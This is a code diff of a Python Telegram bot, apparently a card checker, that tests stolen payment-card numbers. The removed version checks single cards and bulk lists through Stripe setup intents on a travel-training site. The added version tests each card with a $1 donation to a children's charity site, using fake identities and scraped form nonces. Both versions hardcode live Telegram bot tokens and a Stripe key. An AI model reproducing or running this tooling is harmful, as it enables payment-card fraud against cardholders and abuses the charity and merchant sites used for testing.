@@ -1,232 +1,132 @@
-import telebot
-import threading
+import logging
 import requests
+import uuid
 import random
-import string
-import time
-import re
-from telebot.types import Message
+from bs4 import BeautifulSoup
+from faker import Faker
+from telegram import Update
+from telegram.ext import Application, CommandHandler, CallbackContext
 
-ADMIN_ID = 6652287427
-approved_users = set([ADMIN_ID])
+# Setup Faker
+faker = Faker('en_US')
+guid = str(uuid.uuid4())
+muid = str(uuid.uuid4())
+sid = str(uuid.uuid4())
+fakeName = faker.name()
+fakeEmail = f"{faker.first_name().lower()}{random.randint(100000000, 999999999)}@gmail.com"
+fakeZip = faker.zipcode()
 
-bot = telebot.TeleBot('6788669053:AAHHry0sAOx9rkF0lklZUJrMsAnFjvc1EGs')
-stop_checking = set()
+# Function to escape special characters in MarkdownV2
+def escape_markdown(text):
+    return text.replace(".", "\.").replace("_", "\_").replace("*", "\*").replace("[", "\[").replace("]", "\]").replace("(", "\(").replace(")", "\)").replace("~", "\~").replace("`", "\`").replace(">", "\>").replace("#", "\#").replace("+", "\+").replace("-", "\-").replace("=", "\=").replace("|", "\|")
 
-def is_approved(user_id):
-    return user_id in approved_users
+# Define the function to handle the /chk command
+async def chk(update: Update, context: CallbackContext):
+    # Ensure there's a proper input
+    if len(context.args) != 1:
+        await update.message.reply_text("❌ Please provide the card in the correct format: /chk cc|mm|yy|cvv")
+        return
+    
+    # Extract card information
+    card = context.args[0].split('|')
+    if len(card) != 4:
+        await update.message.reply_text("❌ Invalid card details format. Use: /chk <cc|mm|yy|cvv>")
+        return
 
-@bot.message_handler(commands=['approve'])
-def approve_user(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return bot.reply_to(message, "❌ You are not authorized to approve users.")
+    cc = card[0]
+    mes = card[1]
+    ano = card[2]
+    cvv = card[3]
+
+    # Send "please wait" message
+    waiting_message = await update.message.reply_text("⏳ Please wait while we check the card...")
+
+    # Create a session and set headers for requests
+    se = requests.Session()
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+    }
+
     try:
-        user_id = int(message.text.split()[1])
-        approved_users.add(user_id)
-        bot.reply_to(message, f"✅ User {user_id} approved successfully.")
-    except:
-        bot.reply_to(message, "❌ Invalid format. Use /approve <user_id>")
+        # Fetch page to get necessary form values
+        html = se.get('https://needhelped.com/campaigns/poor-children-donation-4/donate/', headers=headers)
+        charitable_session = se.cookies.get('charitable_session')
+        soup = BeautifulSoup(html.text, 'html.parser')
+        charitable_form_id = soup.find('input', {'name': 'charitable_form_id'})['value']
+        charitable_donation_nonce = soup.find('input', {'name': '_charitable_donation_nonce'})['value']
 
-def random_email(length=9):
-    domain = "gmail.com"
-    user = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
-    return f"{user}@{domain}"
+        # Prepare data for Stripe API
+        data = f'type=card&billing_details[name]={fakeName}&billing_details[email]={fakeEmail}&billing_details[address][city]=CONCORD&billing_details[address][country]=AU&billing_details[address][line1]=30+Sydney+Street&billing_details[address][postal_code]={fakeZip}&billing_details[address][state]=NSW&billing_details[phone]=0212+121+212&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F1cb064bd1e%3B+stripe-js-v3%2F1cb064bd1e%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=1321663&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
+        response = se.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        id = response.json()['id']
 
-def create_session():
-    try:
-        session = requests.Session()
-        headers = {'User-Agent': 'Mozilla/5.0'}
-        session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
-        return session
-    except:
-        return None
-
-def check_stripe(cc, session):
-    try:
-        cc_num, mm, yy, cvv = cc.split('|')
-        if '20' in yy:
-            yy = yy.split('20')[1]
-        email = random_email()
+        # Make donation request with stripe payment method
+        headers = {
+            'accept': 'application/json, text/javascript, */*; q=0.01',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'origin': 'https://needhelped.com',
+            'priority': 'u=1, i',
+            'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+            'x-requested-with': 'XMLHttpRequest',
+        }
 
         data = {
-            'type': 'card',
-            'card[number]': cc_num,
-            'card[exp_month]': mm,
-            'card[exp_year]': yy,
-            'card[cvc]': cvv,
-            'billing_details[email]': email,
-            'key': 'pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
+            'charitable_form_id': charitable_form_id,
+            f'{charitable_form_id}': '',
+            '_charitable_donation_nonce': charitable_donation_nonce,
+            '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
+            'campaign_id': '1164',
+            'description': 'Poor Children Donation Support',
+            'ID': '0',
+            'donation_amount': 'custom',
+            'custom_donation_amount': '1.00',
+            'first_name': 'jyrgtfhyy',
+            'last_name': 'tbrfgxcvb',
+            'email': fakeEmail,
+            'address': '30 Sydney Street',
+            'address_2': '',
+            'city': 'CONCORD',
+            'state': 'NSW',
+            'postcode': '2137',
+            'country': 'AU',
+            'phone': '0212 121 212',
+            'gateway': 'stripe',
+            'stripe_payment_method': id,
+            'action': 'make_donation',
+            'form_action': 'make_donation',
         }
-        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'}
-        r = session.post('https://api.stripe.com/v1/payment_methods', data=data, headers=headers, timeout=20)
-        res = r.json()
 
-        if 'error' in res:
-            return res['error']['message']
+        response = se.post('https://needhelped.com/wp-admin/admin-ajax.php', headers=headers, data=data)
+        data = response.json()
 
-        pm_id = res.get('id')
-        if not pm_id:
-            return "Payment Method ID not found"
+        # Send final response after processing
+        if data.get('success') is True:
+            final_message = f"Card: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)} `\n✅ Donation approved: $1"
+        else:
+            error = data['errors'][0]
+            final_message = f"Card: `{escape_markdown(cc)}|{escape_markdown(mes)}|{escape_markdown(ano)}|{escape_markdown(cvv)} `\n❌ Error: {escape_markdown(error)}"
 
-        nonce_req = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
-        nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)', nonce_req.text)
-        if not nonce_match:
-            return "Nonce not found"
-        nonce = nonce_match.group(1)
-
-        intent_data = {
-            'action': 'create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': pm_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': nonce
-        }
-        intent_headers = headers.copy()
-        intent_headers.update({
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'x-requested-with': 'XMLHttpRequest',
-            'origin': 'https://www.thetravelinstitute.com',
-            'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/'
-        })
-        response = session.post(
-            'https://www.thetravelinstitute.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
-            headers=intent_headers,
-            data=intent_data,
-            timeout=20
-        )
-        json_response = response.json()
-        if not json_response.get('success'):
-            return json_response.get('data', {}).get('error', {}).get('message', 'Declined')
-
-        return "Approved"
+        # Update "please wait" message with the final response
+        await waiting_message.edit_text(final_message, parse_mode="MarkdownV2")
+    
     except Exception as e:
-        return f"Error: {str(e)}"
+        await waiting_message.edit_text(f"❌ An error occurred: {str(e)}", parse_mode="MarkdownV2")
 
-@bot.message_handler(commands=['start'])
-def handle_start(message: Message):
-    user = message.from_user
-    if not is_approved(user.id):
-        return bot.reply_to(message, "❌ You are not approved\n🆔 Contact ~ @Kiltes")
-    bot.reply_to(message, f"""
-𝗛𝗲𝗹𝗹𝗼, {user.first_name} 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝗧𝗵𝗲 𝗕𝗼𝘁
+# Setup the bot and handlers
+def main():
+    # Bot token provided
+    bot_token = "8003309975:AAHoBOOwPDR6lRM4k8lhLzAeThqOwELoTM4"
+    application = Application.builder().token(bot_token).build()
 
-𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
-/chk - 𝗧𝗼 𝗖𝗵𝗲𝗰𝗸 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗮𝗿𝗱
-/txt - 𝗧𝗼 𝗖𝗵𝗲𝗰𝗸 𝗠𝗮𝘀𝘀 𝗖𝗮𝗿𝗱𝘀
+    # Add command handler
+    application.add_handler(CommandHandler('chk', chk))
 
-Stripe Charge 5$
+    # Start the bot
+    application.run_polling()
 
-Bᴏᴛ Bʏ @Newlester""", parse_mode='Markdown')
-
-@bot.message_handler(commands=['stop'])
-def handle_stop(message: Message):
-    if not is_approved(message.from_user.id):
-        return bot.reply_to(message, "❌ You are not approved\n🆔 Contact ~ @Kiltes.")
-    stop_checking.add(message.from_user.id)
-    bot.send_message(message.chat.id, "✅ Stopping mass card checking...")
-
-@bot.message_handler(commands=['chk'])
-def handle_chk(message: Message):
-    if not is_approved(message.from_user.id):
-        return bot.reply_to(message, "❌ You are not approved\n🆔 Contact ~ @Kiltes")
-    args = message.text.split(' ', 1)
-    if len(args) != 2:
-        return bot.reply_to(message, '❌ Invalid format. Use: /chk <cc|mm|yy|cvv>')
-    cc = args[1].strip()
-
-    def run():
-        session = create_session()
-        if not session:
-            return bot.send_message(message.chat.id, "❌ Failed to create session")
-
-        loading_msg = bot.send_message(message.chat.id, "⏳ Please wait while we check your card...", parse_mode='Markdown')
-        animation = ['`Checking 🔄`', '`Checking 🔁`', '`Checking 🔃`'] * 2
-        for frame in animation:
-            time.sleep(0.4)
-            bot.edit_message_text(chat_id=message.chat.id, message_id=loading_msg.message_id, text=frame, parse_mode='Markdown')
-
-        result = check_stripe(cc, session)
-        status = "Approved ✅" if "Approved" in result else "Declined ❌"
-        message_text = (
-            f"𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗮𝗿𝗱 𝗖𝗵𝗲𝗰𝗸 | /chk\n\n"
-            f"𝗖𝗮𝗿𝗱 : `{cc}`\n"
-            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {result}\n"
-            f"𝗦𝘁𝗮𝘁𝘂𝘀 - {status}"
-        )
-        bot.edit_message_text(chat_id=message.chat.id, message_id=loading_msg.message_id, text=message_text, parse_mode='Markdown')
-
-    threading.Thread(target=run).start()
-
-@bot.message_handler(commands=['txt'])
-def handle_txt(message: Message):
-    if not is_approved(message.from_user.id):
-        return bot.reply_to(message, "❌ You are not approved\n🆔 Contact ~ @Kiltes")
-    doc = message.document or (message.reply_to_message.document if message.reply_to_message else None)
-    if not doc:
-        return bot.reply_to(message, "❌ Please send or reply to a .txt file using /txt")
-
-    file_info = bot.get_file(doc.file_id)
-    content = bot.download_file(file_info.file_path).decode('utf-8')
-    cards = [line.strip() for line in content.splitlines() if line.strip()]
-    bot.send_message(message.chat.id, f"📥 {len(cards)} cards loaded. Checking...")
-
-    def run():
-        session = create_session()
-        if not session:
-            return bot.send_message(message.chat.id, "❌ Failed to create session")
-
-        hit, dead = 0, 0
-        total = len(cards)
-        user_id = message.from_user.id
-
-        progress_msg = bot.send_message(
-            message.chat.id,
-            f"𝗠𝗮𝘀𝘀 𝗖𝗮𝗿𝗱 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 | /txt\n\n"
-            f"Tᴏᴛᴀʟ » {total}\n"
-            f"Aᴘᴘʀᴏᴠᴇᴅ » 0\n"
-            f"Dᴇᴄʟɪɴᴇᴅ » 0\n"
-            f"Rᴇ𝘀𝗽𝗼𝗻𝘀𝗲 » Starting check...\n"
-            f"Cᴀʀᴅs Lᴇғᴛ » {total}",
-            parse_mode='Markdown'
-        )
-        msg_id = progress_msg.message_id
-
-        for idx, cc in enumerate(cards, 1):
-            if user_id in stop_checking:
-                stop_checking.remove(user_id)
-                bot.edit_message_text(
-                    chat_id=message.chat.id,
-                    message_id=msg_id,
-                    text="⛔ Mass card checking stopped by user.",
-                    parse_mode='Markdown'
-                )
-                return
-
-            res = check_stripe(cc, session)
-
-            if 'Approved' in res:
-                hit += 1
-                bot.send_message(
-                    message.chat.id,
-                    f"𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗖𝗮𝗿𝗱 𝗙𝗼𝘂𝗻𝗱\n𝗖𝗮𝗿𝗱 - `{cc}`\n𝗦𝘁𝗮𝘁𝘂𝘀 - 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱",
-                    parse_mode='Markdown'
-                )
-            else:
-                dead += 1
-
-            bot.edit_message_text(
-                chat_id=message.chat.id,
-                message_id=msg_id,
-                text=(
-                    f"𝗠𝗮𝘀𝘀 𝗖𝗮𝗿𝗱 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 | /txt\n\n"
-                    f"Tᴏᴛᴀʟ » {total}\n"
-                    f"Aᴘᴘʀᴏᴠᴇᴅ » {hit}\n"
-                    f"Dᴇᴄʟɪɴᴇᴅ » {dead}\n"
-                    f"Rᴇ𝘀𝗽𝗼𝗻𝘀𝗲 » {res}\n"
-                    f"Cᴀʀᴅs Lᴇғᴛ » {total - idx}"
-                ),
-                parse_mode='Markdown'
-            )
-
-    threading.Thread(target=run).start()
-
-bot.polling(none_stop=True)
+if __name__ == '__main__':
+    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+    main()
